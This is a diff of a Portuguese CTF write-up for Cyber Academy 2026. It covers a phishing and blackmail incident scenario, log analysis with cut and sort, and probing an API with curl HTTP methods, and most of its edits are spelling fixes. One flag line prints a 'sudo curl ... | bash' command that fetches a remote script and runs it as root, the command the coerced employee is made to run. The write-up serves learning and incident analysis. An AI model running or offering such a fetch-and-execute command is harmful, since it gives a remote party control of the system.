@@ -308,9 +308,9 @@ Agora que temos as credenciais de ambos podemos buscar por mensagens suspeitas e
 Os atacantes utilizaram as credenciais obtidas durante o Spear Phishing para conseguir informações sigilosas do banco, abrindo brecha para chantagear Levi à executar o comando.
 ### 🚩 Flag
 Este é um exemplo extremamente didático do porque não podemos encarar um incidente seguindo uma lógica de "punir o culpado pelo vazamento", quando este ocorre de maneira acidental/involuntária.  
-Vamos analisar a situação: Levi, receioso de ser punido por acidentalmente permitir que atacantes adiquirissem supostas "informações privilegiadas", se viu vulnerável à uma chantagem e foi instrumentalizado como um vetor de ataque crucial.  
+Vamos analisar a situação: Levi, receioso de ser punido por acidentalmente permitir que atacantes adquirissem supostas "informações privilegiadas", se viu vulnerável à uma chantagem e foi instrumentalizado como um vetor de ataque crucial.  
 Observação: Nem sequer temos certeza de que os P3PP4 H4CK3RS realmente possuem as informações críticas que afirmam ter.  
-Podemos concluir que um incidente grave pode ser evitável quando as lideranças e equipes de segurança se demonstram compreensivas em frente à um acidente. Não apenas isso deve ser uma política interna, como deve ser transparente para todos os colaboradores da organização.
+Podemos concluir que um incidente grave pode ser evitável quando as lideranças e equipes de segurança se demonstram compreensivas em frente a um acidente. Não apenas isso deve ser uma política interna, como deve ser transparente para todos os colaboradores da organização.
 
 `Flag: sudo curl 'https://gh4m3sz9t6.execute-api.us-east-1.amazonaws.com/default/install/MQ-2501' | bash`
 
@@ -416,7 +416,7 @@ $ cut -d ' ' -f1 access.log | sort -u
 5.253.115.36
 81.22.36.42
 ```
-Eu poderia utilizar também em conjunto a ferramenta **wc -l**, como já fiz em desafios anteriores, que me retornaria a quantidade de linhas exata. Porém eu queria a informação de _quais_ IPs acessaram o servidor, e não apenas _quantos_.
+Eu poderia utilizar também em conjunto a ferramenta **wc -l** em pipe (|), como já fiz em desafios anteriores, que me retornaria apenas a quantidade de linhas exata. Porém eu queria a informação de _quais_ IPs acessaram o servidor, e não apenas _quantos_.
 
 ### 🚩 Flag
 `Flag: 5`
@@ -698,7 +698,7 @@ Precisamos usar a dica que foi fornecida na descrição do desafio: **"Lembre-se
 - DELETE: deleta dados da requisição.
 - PATCH: modifica parcialmente os dados da requisição.
 
-Há ainda outros métodos avançados como OPTIONS ou HEAD, mas vamos tentar os principais primeiro. Sabemos que não há resposta para o GET, e podemos deduzir com base na dica que o POST não terá nehuma pista. Podemos utilizar o comando `curl` para testar outras requisições rapidamente pelo terminal, com o parâmetro `-X` conseguimos pedir uma requisição diferente de GET.
+Há ainda outros métodos avançados como OPTIONS ou HEAD, mas vamos tentar os principais primeiro. Sabemos que não há resposta para o GET, e podemos deduzir com base na dica que o POST não terá nenhuma pista. Podemos utilizar o comando `curl` para testar outras requisições rapidamente pelo terminal, com o parâmetro `-X` conseguimos pedir uma requisição diferente de GET.
 
 ```
 $ curl -X [requisição] https://gh4m3sz9t6.execute-api.us-east-1.amazonaws.com/api/lkasjdlksjdflkj
@@ -779,3 +779,5 @@ O erro se trata de uma falha de implementação da API pelos desenvolvedores da 
 
 ### Minha Conquista e Experiência
 Finalizei o CTF Cyber Academy 2026 no dia 30 de Julho, conquistando a 15ª posição dentre mais de 800 participantes. Foi uma experiência extremamente divertida que conduziu a adquirir um conhecimento mais amplo sobre API Rest, Terminal Linux, OSINT, Análise de Logs e, claro, documentação de write-ups, de forma muito leve e divertida.
+
+![](Prints/Pasted%20image%2020260730135104.png)
